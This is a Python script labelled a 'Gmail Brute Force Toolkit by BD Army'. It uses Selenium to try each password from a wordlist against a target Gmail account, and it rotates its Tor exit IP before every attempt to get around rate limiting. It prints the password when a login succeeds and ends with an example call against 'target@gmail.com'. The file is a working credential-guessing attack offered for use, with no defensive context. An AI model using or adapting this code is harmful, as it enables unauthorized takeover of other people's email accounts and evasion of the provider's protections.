
# Gmail Brute Force Toolkit by BD Army
# MISS YOU

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from stem import Signal
from stem.control import Controller
import time
import random

def change_ip():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate()
        controller.signal(Signal.NEWNYM)

def brute_force(username, password_file):
    browser = webdriver.Firefox()

    with open(password_file, 'r') as file:
        passwords = file.readlines()

    for password in passwords:
        try:
            change_ip()
            browser.get("https://mail.google.com/")
            time.sleep(2)

            user_elem = browser.find_element_by_name("identifier")
            user_elem.clear()
            user_elem.send_keys(username)
            user_elem.send_keys(Keys.RETURN)
            time.sleep(2)

            pass_elem = browser.find_element_by_name("password")
            pass_elem.clear()
            pass_elem.send_keys(password)
            pass_elem.send_keys(Keys.RETURN)
            time.sleep(3)

            if "myaccount.google.com" in browser.current_url:
                print(f"Password Found: {password}")
                break

        except Exception as e:
            print(f"Error: {e}")
            continue

    browser.quit()

# Example usage
brute_force("target@gmail.com", "custom_passwords.txt")
